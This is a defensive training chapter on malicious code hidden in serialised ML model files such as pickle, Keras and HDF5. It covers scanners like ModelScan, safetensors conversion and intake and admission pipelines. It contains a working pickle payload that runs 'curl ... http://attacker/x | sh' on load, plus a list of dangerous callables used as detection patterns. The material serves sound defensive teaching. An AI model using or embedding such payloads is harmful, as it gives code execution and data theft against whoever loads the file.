# Chapter 04 — Malicious Code in Serialised Model Files

> **Note on AI-assisted content.** Model-file formats and the
> tooling that scans them (ModelScan, Picklescan, HF scanners,
> safetensors) are evolving. The attack surface described below
> reflects documented capabilities of each format; verify
> against the project documentation and the current CVE record
> before relying on a specific detection claim. See
> [`resources.md`](./resources.md).

---

## Why this chapter exists

Chapter 05 argues that consuming third-party models requires
provenance, licence, and safety-testing gates. This chapter
is the part of the intake that most teams overlook until
after an incident: the serialised weight file itself can
contain **executable code**. Loading a weight file is not
always a pure data operation; for several widely used
formats, the loader *runs code* that the artefact can control.

The failure mode this chapter is written against:

> A data scientist downloads a popular community checkpoint
> for a vision model. The checkpoint is a `.pt` file hosted
> on a model-sharing site. They load it in a notebook with
> `torch.load("model.pt")`. The file contains a pickled
> payload that calls `os.system("curl -sL http://.../x | sh")`.
> The notebook pod runs with a service account that reads
> the training-data bucket and holds a short-lived token to
> the model registry. By the time the model has "loaded",
> the attacker has a reverse shell inside the training
> namespace. The data scientist's incident report says they
> "ran the official code from the model's page"; the loader
> did what it was documented to do.

The fix is a combination of **scanning** at the intake gate
(ModelScan, Picklescan, HF-provided scanners), **format
hardening** (safetensors wherever possible, careful loading
flags, sandboxing), and **registry-side enforcement** so
non-safe formats are rejected before they reach a notebook.

You leave this chapter able to:

- Enumerate the executable-code attack surface in pickle-
  backed formats (`.pt`, `.pkl`, `.joblib`), Keras / TF
  SavedModel (`Lambda` layers, custom objects), HDF5 (`.h5`
  with `h5py` + custom objects), and GGUF.
- Explain *what ModelScan and Picklescan check* and *what
  they don't*.
- State the safetensors format's security property and the
  class of attacks it does and does not neutralise.
- Design a pre-ingest scanning pipeline that produces a
  signed scan-attestation attached to the ML-BOM.
- Design a registry admission policy that rejects
  unsupported formats and unsigned scans.
- Recognise the failure modes that make scanning
  decorative.

---

## The attack surface by format

### Pickle (`.pkl`, `.pt`, `.pth`, `.joblib`, `.pickle`)

Python's `pickle` module serialises arbitrary Python
objects. The format is a **stack-based bytecode** whose
opcodes include `REDUCE` and `BUILD`. `REDUCE` instructs the
unpickler to call a callable with arguments. The pickle
format therefore encodes *function calls*; by design, a
pickle byte stream can instruct `pickle.loads` to call any
callable the unpickler can import, with any arguments the
byte stream names.

A minimal exploit payload:

```python
import pickle, os

class Pwn:
    def __reduce__(self):
        return (os.system, ("curl -sL http://attacker/x | sh",))

payload = pickle.dumps(Pwn())
```

The resulting `payload` bytes, when fed to `pickle.loads`,
execute the shell command. The surface is not limited to
`os.system`; `subprocess.Popen`, `builtins.exec`,
`importlib.import_module`, `urllib.request.urlopen`, and
anything else the unpickler's Python environment can resolve
are all candidates.

Formats that layer on top of pickle inherit the surface:

- **`torch.save` / `torch.load`.** PyTorch's native format
  is pickle inside a zip archive. `torch.load` historically
  defaulted to full unpickling. **Since PyTorch 2.6 the
  default changed to `weights_only=True`**, which uses a
  restricted unpickler that whitelists a safe subset of
  callables. Older code bases, long-pinned docker images,
  and tutorials still ship `torch.load(path)` without
  `weights_only=True`; the surface persists in practice.
- **`joblib`.** Scientific-Python model saving. Pickle
  internally. Same surface.
- **`sklearn.externals.joblib`** (removed in modern sklearn
  but still ambient in older codebases).
- **ONNX** files with embedded Python functions are not the
  common case, but ONNX training-mode extensions and some
  conversion artefacts can carry pickles.

The surface is **built into the format**. There is no "safe
subset of pickle" without changing the loader. `weights_only
=True` in PyTorch is the closest thing in a native format;
even then, the whitelist is narrow but not empty — stay
current with PyTorch security advisories.

### Keras / TensorFlow SavedModel and HDF5 (`.h5`)

Keras supports serialising a model's full definition,
including arbitrary **Python callables**:

- **`Lambda` layers** take a Python callable as part of
  their configuration. In older Keras (`h5` format), the
  callable was pickled with the model and executed on load.
- **Custom objects** (custom layers, losses, optimizers,
  activations) are referenced by name; `tf.keras.models.
  load_model(..., custom_objects=...)` is intended to be
  the controlled path, but historical versions of Keras
  deserialised custom objects via pickle paths that are
  reachable by a malicious model file.
- **`Model.save()` to HDF5 or SavedModel.** The SavedModel
  format is a protobuf + an `assets/` directory; the raw
  SavedModel protobuf is less pickle-prone than `.h5`, but
  attached assets and user-registered custom objects are
  still an executable-code surface.
- **Keras 3** introduced `keras_file`/`.keras` with the
  stated goal of removing pickle from the serialisation
  path for most models, and Keras maintainers have published
  advisories on `safe_mode` loading. Keep current — this is
  an active moving target.

The equivalent "default to safe" effort for Keras has lagged
PyTorch; a model file whose provenance you cannot verify
should not be loaded by a Keras version that still accepts
Lambda-layer callables.

### GGUF (`.gguf`)

GGUF (used by llama.cpp and ecosystem) is a tensor-only
container: a header, a tensor count, named tensors with
dtype and shape, and the raw tensor bytes. There is no
executable-code mechanism in the format. The attack surface
is small — malformed-GGUF parser bugs (buffer handling,
integer overflow), but no deserialise-and-execute vector by
design.

GGUF is not a drop-in replacement for every workflow;
training-time saves, optimiser state, and anything beyond
weights are not represented. For *runtime* serving of
inference-only weights, GGUF is attractive.

### Safetensors (`.safetensors`)

The Hugging Face / community format designed specifically
to replace pickle for weight files:

- **Format**: a JSON header followed by raw tensor data.
  Each entry: a name, a dtype, a shape, and offsets into
  the raw data region.
- **No executable code paths.** The loader memory-maps the
  file and casts bytes to tensors. There is no callable
  resolution, no object graph deserialisation, no module
  import triggered by the file's content.
- **Fast and zero-copy** — the format was motivated by
  performance as well as safety.

Safetensors eliminates **pickle-class** attacks. It does
*not*:

- Protect against **weight-space backdoors** — a tensor file
  can still encode a trojaned model whose behaviour on a
  particular trigger is harmful. Weight-space poisoning is
  mod-106 chapter 03's territory.
- Guarantee the file is **the right model**. The format
  carries no identity; signing (chapter 02) is still
  required.
- Validate **tensor contents.** Malformed shapes or NaN /
  Inf values are a different hazard; the format does not
  catch them.
- Replace the broader **artefact** — a model repo on HF
  typically includes a tokeniser, a config, a chat template,
  a few `.py` files. The *weight file* being safetensors
  does not scrub the other files; see "ancillary code
  files" below.

The programme-level rule: **safetensors is the default
weight format for anything your pipeline writes or consumes;
non-safetensors is an exception that requires justification
and extra scanning**.

### Ancillary code files

The model repo surface is wider than the weight file. For
a Hugging Face Transformers model, loading often involves:

- `config.json` — JSON, generally safe but see
  `trust_remote_code` below.
- `tokenizer.json`, `tokenizer_config.json`, special-tokens
  files — JSON.
- `generation_config.json` — JSON.
- `*.py` modules — Python source. **Loaded and executed**
  by `transformers.AutoModel.from_pretrained(...,
  trust_remote_code=True)`. This is a direct code-exec
  surface, controlled by the loader flag.
- `preprocessor_config.json`, `image_processor_config.json`
  — JSON.

`trust_remote_code=True` is **off by default** in modern
Transformers, but tutorials and some model cards instruct
users to turn it on. For any model that *requires*
`trust_remote_code=True`, the `.py` files are a code-review
item at the intake gate; without that review, the loader is
executing a third party's Python inside the training or
serving namespace.

Equivalent flags exist across the ecosystem — Diffusers,
custom-pipeline loaders, and vendor SDKs often have their
own "run the author's code" switches. Enumerate them for
your stack.

---

## ModelScan — what it does

[ModelScan](https://github.com/protectai/modelscan) is an
open-source scanner (Protect AI) targeted at the attack
surface above. In outline:

- **Pickle-based formats** (`.pt`, `.pkl`, `.h5`,
  `.joblib`, `.dill`): walks the pickle bytecode and
  flags opcodes that resolve to known-dangerous callables
  (`os.system`, `subprocess.*`, `exec`, `eval`,
  `builtins.*`, `pickle.*`, `importlib.*`). Behaves like a
  policy-driven unpickler.
- **Keras**: parses the HDF5 structure, extracts the
  model configuration, and flags Lambda layers and
  custom-object references that resolve to dangerous
  patterns.
- **TensorFlow SavedModel**: parses the protobuf and
  flags suspicious operator patterns (e.g. `WriteFile`,
  `ReadFile`, `PyFunc` with user-controlled callables).
- **Severities**: `CRITICAL` for direct code-exec primitives;
  `MEDIUM` / `LOW` for indirect patterns that are
  context-dependent.
- **Output**: a JSON report with per-finding file, offset
  or path, module/function resolved, and a severity. The
  JSON is the input to pipeline enforcement.

A typical invocation at the intake gate:

```bash
modelscan -p path/to/model/directory -r json > scan-report.json
jq '.issues | length' scan-report.json
# non-zero → fail the intake step
```

What ModelScan is **good at**:

- Catching the common exploit patterns the open-source
  samples / proof-of-concepts use.
- Giving a signal fast enough to put in the intake pipeline
  (seconds per file).
- Supporting most file types the ecosystem actually ships.

What ModelScan **cannot** do:

- Guarantee that a malicious pickle **evades its allowlist**.
  New or custom gadgets — a dangerous callable not in the
  rule set — are not flagged. Pickle's reachable callables
  are the entire Python standard library plus every
  installed third-party module.
- Catch **weight-space backdoors** (triggered misbehaviour
  encoded in the weights themselves). ModelScan is a code-
  surface scanner.
- Validate **model behaviour**. A clean scan says the file
  does not contain known-malicious code constructs; it does
  not say the model is safe to deploy.

The programme-level rule: **ModelScan is a necessary gate,
not a sufficient one**. It composes with safetensors
preference (eliminate the surface), with provenance signing
(know who built the file), and with safety evals (test the
behaviour).

### Related scanners

- **Picklescan** (Hugging Face). More narrowly focused on
  pickle; integrated into the HF Hub's background scanner
  that flags uploaded files on the Hub.
- **Hugging Face Hub's scanning pipeline**. HF runs
  Picklescan and ClamAV against uploaded repositories;
  flagged repos show warnings in the UI. HF scan results
  are *not* a substitute for your own scan at intake —
  the file you load may post-date the scan, HF may not
  cover every file type, and the scan is advisory to the
  uploader.
- **ClamAV**. General-purpose malware scanner; useful
  against anything that is actually a dropper or installer
  wrapped as a model file.
- **In-house allowlists**. Some organisations run their own
  stricter unpickler as a scanner — walk the opcode stream,
  accept only a tiny whitelist (NumPy arrays, torch
  tensors, dict / list / primitives). Equivalent to running
  `torch.load(weights_only=True)` as a scan step.

### Positive patterns a scanner should flag

Not every finding is "contains a `REDUCE`". Realistic
patterns:

- `os.system`, `subprocess.Popen`, `subprocess.call`,
  `subprocess.check_output`.
- `builtins.exec`, `builtins.eval`, `exec`, `eval`.
- `urllib.request.urlopen`, `requests.get`, `requests.post`
  (data exfiltration or payload fetch).
- `socket.socket` and friends (reverse shells).
- `importlib.import_module`, `__import__` (gadget-chaining).
- `pickle.loads` (nested unpickling).
- `pty.spawn`, `os.spawn*`.
- Keras / TF: `Lambda` layer with a non-whitelisted
  callable name; TF ops `tf.io.write_file`, `tf.io.read_file`,
  `tf.py_function` with user-supplied code.

For custom org identifiers, extend the rule set to flag
internal callable paths that could be reached by a hostile
pickle inside a known workload.

---

## Build-time preference for safetensors

Scanning is downstream of a cheaper intervention: do not
load formats that need scanning.

Programme-level rule set (reasonable baseline):

- **New internal artefacts**: safetensors for weights; JSON
  for configs; signed CycloneDX ML-BOM; no pickle anywhere
  in the pipeline unless the receiving loader is pinned to
  `weights_only=True`.
- **Imported third-party weights**: safetensors preferred;
  if only pickle-backed is available, scan and either
  convert to safetensors post-scan or quarantine. HF Hub
  provides a one-liner conversion via `safetensors.torch.
  save_file` for most PyTorch checkpoints.
- **Keras models**: Keras 3's `.keras` format with
  `safe_mode=True` is the direction; older `.h5`
  checkpoints are quarantined and scanned.
- **TF SavedModel**: audit the signature definitions; reject
  SavedModels whose signatures include unexpected ops
  (`WriteFile`, `ReadFile`, `PyFunc`).
- **Lambda layers**: banned from internal models; flagged
  at scan for external models.
- **`trust_remote_code=True`**: off by default in every
  loader; opt-in via a signed exception that references a
  code-review of the specific `.py` files; the exception
  references a committed pin of the HF revision.
- **PyTorch loading**: `torch.load(..., weights_only=True,
  map_location="cpu")` is the default; `weights_only=False`
  requires a signed exception and a scan report.

These rules keep the loader doing *data* work, not *code*
work. Scanning catches what gets through; the format
default keeps the number of things to catch small.

---

## Converting pickle-backed artefacts to safetensors

For imported `.pt` / `.pth` weights where the authors have
not published a safetensors version:

```python
import torch
from safetensors.torch import save_file

# Load with the restricted unpickler.
state_dict = torch.load(
    "model.pt",
    map_location="cpu",
    weights_only=True,          # critical
)
# Verify shape of the dict matches expectations
# (keys the architecture expects, dtype tensors only).
save_file(state_dict, "model.safetensors")
```

This conversion step is the right place to:

1. Enforce `weights_only=True` so the load itself cannot
   execute code.
2. Hash the resulting safetensors file; record the hash in
   the ML-BOM entry.
3. Sign (`cosign sign` of the ORAS-pushed descriptor;
   chapter 02).

If `weights_only=True` **fails** on the source — because
the checkpoint pickled a non-whitelisted class — the
conversion is a signal, not a bug. Hostile files fail
loudly; benign-but-non-standard files require an engineering
decision (write a safe loader, or reject the file).

For Keras: the Keras 3 `safe_mode=True` loader, followed by
re-save in the `.keras` format, is the equivalent. For TF
SavedModel: load, inspect the signature defs, re-save with
`tf.saved_model.save` writing a known signature.

---

## The intake-time scanning pipeline

A workable intake pipeline (chapter 05's runbook is the
org-level framing; this is the scanning-step detail):

```
┌───────────────┐   ┌───────────────┐   ┌───────────────┐
│ Fetch         │ → │ Format gate   │ → │ ModelScan     │
│ (HF / vendor) │   │ (allowed set) │   │ (deep scan)   │
└───────┬───────┘   └───────┬───────┘   └───────┬───────┘
        │                   │                   │
        ▼                   ▼                   ▼
┌───────────────┐   ┌───────────────┐   ┌───────────────┐
│ safetensors   │   │ Convert       │   │ Sign scan     │
│ check / cvt   │ ← │ to safetens.  │ ← │ report; emit  │
└───────┬───────┘   └───────────────┘   │ attestation   │
        │                               └───────┬───────┘
        ▼                                       │
┌───────────────┐                               │
│ Weight hash;  │ ← — — — — — — — — — — — — — — ┘
│ ML-BOM entry  │
└───────┬───────┘
        │
        ▼
┌───────────────┐
│ Internal      │
│ mirror; cosign│
│ sign + attest │
└───────────────┘
```

Each stage:

1. **Fetch**. Pull the model into a quarantine namespace
   whose service account has no production permissions.
   The quarantine namespace is a different network, a
   different registry, a different storage bucket from
   production. Egress is restricted; this prevents a
   malicious payload executed during a loader fault from
   reaching anything it can harm.
2. **Format gate**. If the repository contains disallowed
   file types (e.g. `.h5` on a programme that bans Keras-H5),
   the intake fails here with a clear reason.
3. **ModelScan deep scan**. Run with the organisation's
   rule set. Any `CRITICAL` finding fails the intake. The
   JSON report is retained for the ML-BOM entry.
4. **Safetensors preference / conversion**. If the fetched
   weights are not already safetensors, convert using the
   `weights_only=True` loader. Any failure fails the intake.
5. **Hash**. SHA-256 the safetensors (and any ancillary
   files kept). The hashes become the dataset / adapter
   component entries in the ML-BOM.
6. **Sign and attest**. The intake pipeline's identity
   signs:
   - the model artefact (cosign over the ORAS-pushed
     descriptor);
   - the ML-BOM entry for the imported model (CycloneDX
     attestation);
   - the scan report (as a separate attestation of a custom
     `predicateType`, e.g. `https://company.com/attestations/
     modelscan-report/v1`).
7. **Internal mirror**. The signed artefact lands in the
   internal registry under a known-good path. Users
   downstream pull only from the mirror; the admission
   controller rejects anything whose provenance does not
   trace back to the intake-signer identity.

Chapter 05 adds licence review, provenance verification of
the upstream, and safety-evaluation gates on top of this
scanning pipeline. Chapter 04's job is to make loading-code-
exec attacks fail at step 3 or step 4.

---

## Admission-time enforcement

The intake pipeline is one side of the control; the
admission policy at the registry and at serving is the
other. Policies worth enforcing (chapter 02's sigstore
policy-controller language):

- **Format allowlist.** Only `*.safetensors`, `*.gguf`,
  `*.onnx` (with the ancillary-code policy below),
  `*.keras` with `safe_mode=True` metadata; reject
  `*.pkl`, `*.pth`, `*.h5` from production.
- **Required attestations.** Every model artefact must
  carry: a SLSA provenance attestation (chapter 01), a
  CycloneDX ML-BOM attestation (chapter 03), and a scan-
  report attestation signed by the intake pipeline (this
  chapter).
- **Scan-report content policy.** The scan-report
  attestation must report zero `CRITICAL` findings and no
  `MEDIUM` findings on the serving-tier policy. The
  attestation includes the scanner version and rule-set
  version so the policy can enforce a floor.
- **Ancillary-code policy.** Loading flags that enable
  code execution — `trust_remote_code=True`,
  `allow_pickle=True`, Keras `safe_mode=False` — are off
  by default in the serving container. The serving
  container's startup script asserts the flag state and
  exits non-zero if a model config attempts to override.

Admission policies without the attestations are a syntax
check. The attestations without an admission policy are a
document. Both together are the gate.

---

## Standard failure modes

- **Scanning without format control.** The team runs
  ModelScan but still accepts `.pt` into production. New
  CVEs in `weights_only` or new gadgets in the Python
  standard library create a steady background of ways past
  the scanner. Fix: safetensors (or GGUF) is the default;
  non-safetensors requires exception.
- **`weights_only=False` for backward compatibility.** A
  one-line "quick fix" in a loader to unbreak a legacy
  checkpoint. The fix persists; new code copies it. Fix:
  `weights_only=False` requires a signed exception with an
  expiry; CI lints flag unflagged calls.
- **`trust_remote_code=True` on a user's advice.** The
  model card says "set `trust_remote_code=True` to use the
  model"; the engineer sets it; the custom code never gets
  reviewed. Fix: `trust_remote_code=True` requires an
  intake-time code review and a signed exception bound to
  the HF revision.
- **Loading in the training namespace, not quarantine.**
  Scan runs *after* an engineer has already run
  `torch.load` in the training pod. Fix: fetch and load
  only in quarantine; the training pod gets the mirrored,
  pre-scanned artefact.
- **ModelScan upgrade lag.** The intake pipeline pins an
  old scanner version with an outdated rule set. Fix:
  scanner version is in the ML-BOM; admission policy
  requires a floor; the floor advances per security
  bulletin.
- **Scans unsigned or unverifiable.** The scan report is
  written to a mutable S3 bucket; nothing verifies the
  signer. Fix: scan report is signed by the intake
  pipeline's identity (chapter 02) and admitted only via
  attestation verification.
- **Scanner finds nothing on an obfuscated pickle.** Code
  obfuscation (base64-wrapped payloads decoded by a
  benign-looking first layer) can bypass pattern-based
  rules. Fix: run the file in a sandboxed loader with
  `weights_only=True`; refuse to load anything that fails;
  layer defences — scanner catches the obvious, loader
  disables the mechanism, sandbox limits blast radius.
- **Lambda layers "needed" in Keras models.** A fine-tuner
  used a Lambda layer and the team keeps the pattern. Fix:
  refactor Lambdas into actual Keras layers (subclass
  `tf.keras.layers.Layer`); for imported models, prefer
  the HF Transformers equivalent architecture over Keras-
  H5.
- **Scan-report retention gaps.** The report exists but
  nothing retains it long enough for an audit six months
  later. Fix: scan report is an ML-BOM attestation; the
  attestation store's retention matches the model's
  retention.
- **Internal `.pt` saves to a shared bucket.** Even for
  "obviously internal" models, the save path is `.pt`
  from a notebook; the file is loaded elsewhere with
  defaults. Fix: internal save APIs produce safetensors
  by default; the save helper refuses non-safetensors
  unless given an explicit flag that CI lints for.
- **Weight-space backdoor assumed scanned-out.** A clean
  ModelScan is misread as "the model is safe to deploy".
  Fix: the scan report is one of several attestations;
  weight-space / behavioural evaluation (mod-106) is a
  separate attestation; serving admission requires both.

---

## Summary

- Several widely used model-serialisation formats are
  **executable-code surfaces** by design. Pickle-based
  `.pt` / `.pkl` / `.joblib`, Keras `.h5` with Lambda
  layers / custom objects, and some TF SavedModel signatures
  can run attacker-controlled code on load.
- **Safetensors** is the HF / community format designed to
  eliminate the deserialise-to-execute class of attacks for
  weights. It does not stop weight-space backdoors or
  cover the full model repo; use it with signing, scanning,
  and behavioural evaluation.
- **GGUF** is similarly tensor-only and safe-by-design for
  inference-only consumption.
- **ModelScan** and **Picklescan** are rule-based scanners
  that catch common exploit patterns. They are necessary
  but not sufficient; new gadgets or obfuscated payloads
  slip rules.
- **PyTorch `weights_only=True`** (default in modern
  PyTorch) and **Keras `safe_mode=True`** are the loader-
  side hardening. Keep them on; treat opt-outs as signed
  exceptions.
- **`trust_remote_code=True`** and equivalent "run the
  author's Python" flags turn third-party `.py` files
  into direct code-execution surface. Code-review the
  `.py` files at intake and bind the exception to a pinned
  HF revision.
- The **intake-time pipeline** fetches into quarantine,
  format-gates, scans, converts to safetensors, hashes,
  signs, and mirrors. Users downstream pull only from the
  mirror.
- **Admission at the registry and at serving** enforces
  format, required attestations, scan-report content, and
  loading-flag defaults. The attestation ecosystem from
  chapters 01–03 is where the enforcement lives.
